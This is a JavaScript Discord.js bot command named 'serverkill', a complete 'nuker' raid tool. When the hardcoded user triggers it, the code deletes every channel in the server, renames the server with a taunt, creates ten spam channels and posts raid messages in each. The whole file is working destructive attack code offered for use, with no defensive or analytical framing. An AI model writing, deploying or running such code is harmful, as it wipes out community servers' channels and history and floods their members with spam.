const { SlashCommandBuilder, PermissionFlagsBits, ChannelType } = require('discord.js');

module.exports = {
    data: new SlashCommandBuilder()
        .setName('serverkill')
        .setDescription('Deletes all channels and replaces them with spam. ADMIN ONLY')
        .setDefaultMemberPermissions(PermissionFlagsBits.Administrator), // Or manage server, up to you

    async execute(interaction) {
        // Replace with the User ID who is authorized to use command
        const allowedUserID = '1356445926553554974';

        if (interaction.user.id !== allowedUserID) {
            return interaction.reply({ content: 'You are not authorized to use this command.', ephemeral: true });
        }

        await interaction.deferReply({ ephemeral: true }); // Acknowledge the command

        const guild = interaction.guild;

        // Delete all existing channels
        guild.channels.cache.forEach(async (channel) => {
            try {
                await channel.delete();
            } catch (error) {
                console.error(`Error deleting channel ${channel.name}:`, error);
            }
        });

        // Change server name
        try {
            await guild.setName('Reap says stop skidding');
        } catch (error) {
            console.error('Error changing server name:', error);
        }

        // Create new channels and spam
        for (let i = 0; i < 10; i++) { // creates 10 channels
            try {
                const channel = await guild.channels.create('reaper-on-top-kiddie-dont-skid-no-more', {
                    type: ChannelType.Text,
                });

                // Spam messages in the new channel
                for (let j = 0; j < 5; j++) { // sends 5 messages per channel
                    await channel.send('get raided by reap');
                }
            } catch (error) {
                console.error('Error creating/spamming channel:', error);
            }
        }

        await interaction.editReply({ content: 'Server nuked successfully!', ephemeral: true });
    },
};
